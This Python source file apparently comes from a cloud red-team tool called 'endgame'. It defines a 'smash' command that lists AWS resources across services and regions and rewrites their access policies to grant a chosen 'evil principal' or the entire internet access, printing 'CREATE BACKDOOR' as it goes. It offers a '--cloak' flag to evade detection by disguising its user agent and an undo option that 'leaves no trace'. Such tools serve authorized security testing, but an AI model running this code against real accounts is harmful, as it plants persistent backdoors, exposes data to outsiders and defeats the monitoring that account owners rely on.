"""
Smash your AWS Account to pieces by exposing massive amounts of resources to a rogue principal or to the internet
"""
import logging
import click
import boto3
from policy_sentry.util.arns import (
    parse_arn_for_resource_type,
    get_resource_path_from_arn,
)
from endgame import set_log_level
from endgame.shared.aws_login import get_boto3_client, get_current_account_id
from endgame.shared.validate import click_validate_supported_aws_service, click_validate_user_or_principal_arn, click_validate_comma_separated_resource_names
from endgame.shared import utils, constants, scary_warnings
from endgame.shared.resource_results import ResourceResults
from endgame.command.expose import expose_service
from endgame.shared.response_message import ResponseMessage

logger = logging.getLogger(__name__)
END = "\033[0m"


@click.command(name="smash", short_help="Smash your AWS Account to pieces by exposing massive amounts of resources to a"
                                        " rogue principal or to the internet")
@click.option(
    "--service",
    "-s",
    type=str,
    required=True,
    help=f"The AWS service in question. Valid arguments: {', '.join(constants.SUPPORTED_AWS_SERVICES)}",
    callback=click_validate_supported_aws_service,
)
@click.option(
    "--evil-principal",
    "-e",
    type=str,
    required=True,
    help="Specify the name of your resource",
    callback=click_validate_user_or_principal_arn,
    envvar="EVIL_PRINCIPAL"
)
@click.option(
    "--profile",
    "-p",
    type=str,
    required=False,
    help="Specify the AWS IAM profile.",
    envvar="AWS_PROFILE"
)
@click.option(
    "--region",
    "-r",
    type=str,
    required=False,
    default="us-east-1",
    help="The AWS region. Set to 'all' to iterate through all regions.",
    envvar="AWS_REGION"
)
@click.option(
    "--dry-run",
    "-d",
    is_flag=True,
    default=False,
    help="Dry run, no modifications",
)
@click.option(
    "--undo",
    "-u",
    is_flag=True,
    default=False,
    help="Undo the previous modifications and leave no trace",
)
@click.option(
    "--cloak",
    "-c",
    is_flag=True,
    default=False,
    help="Evade detection by using the default AWS SDK user agent instead of one that indicates usage of this tool.",
)
@click.option(
    "--exclude",
    "-e",
    "excluded_names",
    type=str,
    default="",
    help="A comma-separated list of resource names to exclude from results",
    envvar="EXCLUDED_NAMES",
    callback=click_validate_comma_separated_resource_names
)
@click.option(
    "--excluded-services",
    type=str,
    default="",
    help="A comma-separated list of services to exclude from results",
    envvar="EXCLUDED_SERVICES",
    callback=click_validate_comma_separated_resource_names
)
@click.option(
    "-v",
    "--verbose",
    "verbosity",
    count=True,
)
def smash(service, evil_principal, profile, region, dry_run, undo, cloak, excluded_names, excluded_services, verbosity):
    """
    Smash your AWS Account to pieces by exposing massive amounts of resources to a rogue principal or to the internet
    """
    set_log_level(verbosity)
    # Get the current account ID
    sts_client = get_boto3_client(profile=profile, service="sts", region="us-east-1", cloak=cloak)
    current_account_id = get_current_account_id(sts_client=sts_client)
    if evil_principal.strip('"').strip("'") == "*":
        if not scary_warnings.confirm_anonymous_principal():
            utils.print_red("User cancelled, exiting")
            exit()
        else:
            print()
            
        principal_type = "internet-wide access"
        principal_name = "*"
    else:
        principal_type = parse_arn_for_resource_type(evil_principal)
        principal_name = get_resource_path_from_arn(evil_principal)
    results = []
    user_provided_service = service
    if user_provided_service == "all" and region == "all":
        utils.print_red("--service all and --region all detected; listing all resources across all services in the "
                        "account. This might take a while - about 5 minutes.")
    elif region == "all":
        logger.debug("'--region all' selected; listing resources across the entire account, so this might take a while")
    else:
        pass
    if user_provided_service == "all":
        logger.debug("'--service all' selected; listing resources in ARN format to differentiate between services")

    resource_results = ResourceResults(
        user_provided_service=user_provided_service,
        user_provided_region=region,
        current_account_id=current_account_id,
        profile=profile,
        cloak=cloak,
        excluded_names=excluded_names,
        excluded_services=excluded_services
    )
    results = resource_results.resources

    if undo and not dry_run:
        utils.print_green("UNDO BACKDOOR:")
    elif dry_run and not undo:
        utils.print_red("CREATE BACKDOOR (DRY RUN):")
    elif dry_run and undo:
        utils.print_green("UNDO BACKDOOR (DRY RUN):")
    else:
        utils.print_red("CREATE_BACKDOOR:")

    for resource in results:
        if resource.name not in excluded_names:
            # feed the name, region, and translated_service based on what it is for each resource
            name = resource.name
            region = resource.region
            translated_service = utils.get_service_translation(provided_service=resource.service)
            client = get_boto3_client(profile=profile, service=translated_service, region=region, cloak=cloak)
            response_message = smash_resource(service=resource.service, region=region, name=name,
                                              current_account_id=current_account_id,
                                              client=client, undo=undo, dry_run=dry_run, evil_principal=evil_principal)
            if undo and not dry_run:
                utils.print_remove(response_message.service, response_message.resource_type, response_message.resource_name, principal_type, principal_name, success=response_message.success)
            elif undo and dry_run:
                utils.print_remove(response_message.service, response_message.resource_type, response_message.resource_name, principal_type, principal_name, success=response_message.success)
            elif not undo and dry_run:
                utils.print_add(response_message.service, response_message.resource_type, response_message.resource_name, principal_type, principal_name, success=response_message.success)
            else:
                utils.print_add(response_message.service, response_message.resource_type, response_message.resource_name, principal_type, principal_name, success=response_message.success)
        else:
            logger.debug(f"Excluded: {resource.arn}")


def smash_resource(
        service: str,
        region: str,
        name: str,
        current_account_id: str,
        client: boto3.Session.client,
        undo: bool,
        dry_run: bool,
        evil_principal: str,
) -> ResponseMessage:
    response_message = expose_service(provided_service=service, region=region, name=name,
                                      current_account_id=current_account_id,
                                      client=client, undo=undo, dry_run=dry_run, evil_principal=evil_principal)
    return response_message
